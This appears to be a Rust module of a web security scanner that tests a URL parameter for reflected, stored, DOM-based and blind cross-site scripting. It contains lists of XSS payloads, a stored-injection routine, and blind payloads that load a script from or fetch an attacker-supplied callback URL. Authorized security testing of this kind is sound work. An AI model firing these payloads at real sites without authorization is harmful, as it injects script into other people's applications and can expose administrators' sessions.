use colored::Colorize;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct XssFinding {
    payload: String,
    xss_type: String,
    evidence: String,
    severity: String,
}

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const REFLECT_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<svg><animate onbegin=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
];

const ENCODED_PAYLOADS: &[&str] = &[
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "%3Csvg%20onload%3Dalert(1)%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
];

pub async fn reflect(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} XSS Reflected Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut findings = Vec::new();

    for payload in REFLECT_PAYLOADS.iter().chain(ENCODED_PAYLOADS.iter()) {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        if let Ok(resp) = client.get(&test_url).send().await {
            let body = resp.text().await.unwrap_or_default();
            if body.contains(payload) {
                findings.push(XssFinding {
                    payload: payload.to_string(),
                    xss_type: "Reflected".to_string(),
                    evidence: "Payload reflected unescaped in response".to_string(),
                    severity: "HIGH".to_string(),
                });
                println!("{} [HIGH] Reflected XSS found!", "[!]".red().bold());
                println!("  {} Payload: {}", "•".cyan(), payload);
            }
        }
    }

    if findings.is_empty() {
        println!("{} No reflected XSS detected.", "[-]".yellow().bold());
    } else {
        println!("\n{} {} finding(s)", "[*]".cyan().bold(), findings.len());
    }
    Ok(())
}

pub async fn store(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} XSS Stored Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let marker = "psxss_marker_a1b2c3";
    let payload = format!("<script>var x='{}';</script>", marker);

    let form = [(param, &payload[..])];
    println!("{} Injecting payload via POST...", "[*]".cyan().bold());
    let resp = client.post(url).form(&form).send().await?;
    println!(
        "{} Injected. Status: {}",
        "[*]".cyan().bold(),
        resp.status()
    );

    println!(
        "{} Checking if payload is stored and reflected...",
        "[*]".cyan().bold()
    );
    let check_resp = client.get(url).send().await?;
    let body = check_resp.text().await.unwrap_or_default();

    if body.contains(marker) {
        println!("{} [HIGH] Stored XSS confirmed!", "[!]".red().bold());
        println!(
            "  {} Payload persisted and reflected on page load",
            "•".cyan()
        );
    } else {
        println!(
            "{} Payload not reflected on this page. Check other pages that display user content.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
}

pub async fn dom(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} XSS DOM-Based Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let resp = client.get(url).send().await?;
    let body = resp.text().await.unwrap_or_default();

    let dom_sinks = [
        ("innerHTML", "document.innerHTML"),
        ("document.write", "document.write("),
        ("eval(", "eval("),
        ("setTimeout", "setTimeout("),
        ("setInterval", "setInterval("),
        ("location.hash", "location.hash"),
        ("location.search", "location.search"),
        ("window.name", "window.name"),
        ("document.referrer", "document.referrer"),
        ("insertAdjacentHTML", "insertAdjacentHTML("),
    ];

    let sources = [
        ("location.hash", "location.hash"),
        ("location.search", "location.search"),
        ("location.href", "location.href"),
        ("document.URL", "document.URL"),
        ("document.referrer", "document.referrer"),
        ("window.name", "window.name"),
    ];

    let mut found_sinks = Vec::new();
    let mut found_sources = Vec::new();

    for (name, pattern) in &dom_sinks {
        if body.contains(pattern) {
            found_sinks.push(*name);
        }
    }
    for (name, pattern) in &sources {
        if body.contains(pattern) {
            found_sources.push(*name);
        }
    }

    if !found_sinks.is_empty() {
        println!("{} Potential DOM sinks found:", "[*]".cyan().bold());
        for s in &found_sinks {
            println!("  {} {}", "•".cyan(), s);
        }
    }
    if !found_sources.is_empty() {
        println!("{} Potential DOM sources found:", "[*]".cyan().bold());
        for s in &found_sources {
            println!("  {} {}", "•".cyan(), s);
        }
    }

    if !found_sinks.is_empty() && !found_sources.is_empty() {
        println!(
            "\n{} [HIGH] Potential DOM-based XSS — source-to-sink flow possible",
            "[!]".red().bold()
        );
        println!(
            "  {} Review JavaScript for data flow from source to sink",
            "•".cyan()
        );
    } else {
        println!(
            "\n{} No obvious DOM XSS patterns detected.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
}

pub async fn blind(
    url: &str,
    param: &str,
    callback_url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} XSS Blind Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:          {}", "[*]".cyan().bold(), url);
    println!("{} Param:        {}", "[*]".cyan().bold(), param);
    println!("{} Callback:     {}", "[*]".cyan().bold(), callback_url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let payloads = [
        format!("<script src=\"{}\"></script>", callback_url),
        format!("<img src=x onerror=\"fetch('{}')\">", callback_url),
        format!("<svg onload=\"new Image().src='{}'\">", callback_url),
    ];

    for payload in &payloads {
        let form = [(param, payload.as_str())];
        let _ = client.post(url).form(&form).send().await;
        println!("{} Injected: {}", "•".cyan(), payload);
    }

    println!(
        "\n{} Payloads injected. Monitor callback server for hits.",
        "[*]".cyan().bold()
    );
    println!(
        "{} If the payload executes in an admin panel, you'll see a callback.",
        "[*]".cyan().bold()
    );
    Ok(())
}
